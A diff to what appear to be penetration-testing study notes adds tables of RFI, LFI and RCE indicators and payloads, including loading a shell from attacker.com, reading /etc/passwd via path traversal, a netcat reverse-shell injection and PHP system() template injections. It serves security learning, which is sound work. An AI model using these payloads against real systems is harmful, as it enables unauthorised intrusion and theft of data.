@@ -368,6 +368,31 @@ What Nmap scanning switch employs the use of default scripts during a scan? _-sC
 - RCE is when an attacker can run arbitrary commands or code on a server, often leading to full control.
   - RCE is the end goal of many attacks — like RFI, LFI, insecure deserialization, or command injection.
 
+### What to Look For During Testing
+| Indicator                                         | Description                                     |
+| ------------------------------------------------- | ----------------------------------------------- |
+| URL parameters with `page=`, `file=`, `template=` | May allow inclusion of external or local files  |
+| Forms or inputs that trigger backend processing   | Possible injection points                       |
+| Error messages showing file paths                 | Reveal vulnerable includes or misconfigurations |
+| Responses reflecting content from other sources   | May indicate RFI is working                     |
+
+### Common RFI Payloads
+| Payload                                                 | Purpose                                     |
+| ------------------------------------------------------- | ------------------------------------------- |
+| `http://attacker.com/shell.txt`                         | Load your reverse shell or PHP payload      |
+| `//attacker.com/shell.txt`                              | Bypass filters (protocol-relative URL)      |
+| `php://filter/convert.base64-encode/resource=index.php` | LFI payload to view source                  |
+| `../../../../../../etc/passwd`                          | LFI (can lead to RCE if combined with logs) |
+
+### Common RCE Payloads
+| Payload                        | Context / Example Use                            |
+| ------------------------------ | ------------------------------------------------ |
+| `;id` or `&& whoami`           | Command injection test in URL or form field      |
+| `127.0.0.1 && nc -e /bin/bash` | RCE via injected netcat reverse shell            |
+| `' + system('id') + '`         | RCE in PHP or Python-based templates             |
+| `${@system($_GET['cmd'])}`     | PHP RCE in misconfigured templates or eval calls |
+| `$(whoami)`                    | Unix-style command substitution                  |
+
 
 
 
